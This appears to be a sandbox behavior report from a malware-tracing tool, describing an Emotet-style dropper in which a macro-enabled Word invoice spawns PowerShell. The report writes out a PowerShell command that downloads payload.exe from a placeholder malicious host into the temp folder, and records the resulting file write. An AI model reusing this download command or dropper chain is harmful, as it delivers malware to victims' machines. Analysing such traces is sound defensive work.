@@ -1,0 +1,30 @@
+======================================================================
+MalTrace-LM Controlled Behavior Report - Sample: dropper_emotet_01
+======================================================================
+Root Processes: [7890]
+Child Processes: [8100]
+Major Category Counts: {'process': 2, 'file': 1}
+----------------------------------------------------------------------
+
+[SECURITY ANCHORS]
+  - [evt_4002] (PID 8100) (CommandShellLaunch) Process powershell.exe (PID 8100) launched command shell or interpreter powershell.exe with arguments powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://malicious-domain-example.com/payload.exe', '$env:TEMP\payload.exe').
+
+[PROCESS BEHAVIOR SUMMARIES]
+
+--- Process: WINWORD.EXE (PID 7890) ---
+  Lineage Path: WINWORD.EXE (7890)
+  Parent Relationship: Root Process (No Parent)
+  Event Category Counts: {'process': 1}
+  Behavior Statements:
+    * [evt_4001 | Order 1] Process WINWORD.EXE (PID 7890) spawned executable C:\Program Files\Microsoft Office\Office16\WINWORD.EXE with command line WINWORD.EXE C:\Users\<USER>\Downloads\Invoice_9921.docm.
+
+--- Process: powershell.exe (PID 8100) ---
+  Lineage Path: WINWORD.EXE (7890) -> powershell.exe (8100)
+  Parent Relationship: Child of WINWORD.EXE (PID 7890)
+  Event Category Counts: {'process': 1, 'file': 1}
+  High-Value Actions: ['CommandShellLaunch', 'Process powershell.exe (PID 8100) launched command shell or interpreter powershell.exe with argument']
+  Behavior Statements:
+    * [evt_4002 | Order 2] [CommandShellLaunch] Process powershell.exe (PID 8100) launched command shell or interpreter powershell.exe with arguments powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://malicious-domain-example.com/payload.exe', '$env:TEMP\payload.exe').
+    * [evt_4003 | Order 3] Process proc_8100.exe (PID 8100) performed WriteFile on file path C:\Users\<USER>\AppData\Local\Temp\payload.exe.
+
+======================================================================
